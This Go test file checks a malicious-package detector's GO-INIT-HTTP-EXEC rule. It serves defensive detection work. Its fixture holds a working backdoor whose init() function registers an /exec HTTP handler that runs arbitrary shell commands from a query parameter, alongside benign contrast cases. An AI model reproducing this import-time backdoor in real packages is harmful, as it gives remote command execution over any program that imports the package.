package detect

import "testing"

// The testkusion v0.1.1 shape (GCVE-110-GO-2026-013108): init() wires command handlers into the
// default mux, so importing the package exposes them.
const goInitBackdoor = `package testkusion

import (
	"net/http"
	"os/exec"
)

func init() {
	http.HandleFunc("/exec", execHandler)
	http.HandleFunc("/ping", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte("}")) })
}

func execHandler(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")
	out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
	w.Write(out)
}
`

func goMints(content string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "m", Ecosystem: "go", PkgbuildContent: content})).Malicious
}

func TestGoInitHTTPExecBackdoor(t *testing.T) {
	if !has(Detect(&PackageContext{Name: "m", Ecosystem: "go", PkgbuildContent: goInitBackdoor}), "GO-INIT-HTTP-EXEC") {
		t.Fatal("init() HTTP command backdoor not detected")
	}
	marked := "// ==== github.com/x/y@v0.1.1/main.go ====\n" + goInitBackdoor
	if !goMints(marked) {
		t.Error("backdoor in main.go must mint")
	}
	if has(Detect(&PackageContext{Name: "m", Ecosystem: "go", PkgbuildContent: "// ==== github.com/x/y@v0.1.1/main_test.go ====\n" + goInitBackdoor}), "GO-INIT-HTTP-EXEC") {
		t.Error("the same code in a _test.go file is not import-time code")
	}
}

func TestGoInitHTTPExecBenignShapes(t *testing.T) {
	for name, src := range map[string]string{
		// net/http/pprof: init() registers handlers, nothing executes commands.
		"pprof": "package pprof\nimport \"net/http\"\nfunc init() {\n\thttp.HandleFunc(\"/debug/pprof/\", Index)\n}\nfunc Index(w http.ResponseWriter, r *http.Request) { _ = r.URL.Query().Get(\"debug\") }\n",
		// A command server the caller starts: handlers registered from a constructor, not init().
		"constructor": "package srv\nimport (\"net/http\"; \"os/exec\")\nfunc init() { setup() }\nfunc New() *http.ServeMux {\n\tm := http.NewServeMux()\n\tm.HandleFunc(\"/run\", func(w http.ResponseWriter, r *http.Request) { exec.Command(\"sh\", \"-c\", r.FormValue(\"c\")) })\n\treturn m\n}\n",
	} {
		if has(Detect(&PackageContext{Name: "m", Ecosystem: "go", PkgbuildContent: src}), "GO-INIT-HTTP-EXEC") {
			t.Errorf("%s: fired", name)
		}
	}
}

func TestGoInitBodiesSkipsBracesInLiterals(t *testing.T) {
	b := goInitBodies("func init() {\n\ts := \"}\"\n\tr := '}'\n\thttp.HandleFunc(\"/x\", h)\n}\nfunc other() {}\n")
	if len(b) != 1 || !goHandleRe.MatchString(b[0]) || goInitOpenRe.MatchString(b[0]) {
		t.Errorf("bodies %q", b)
	}
}
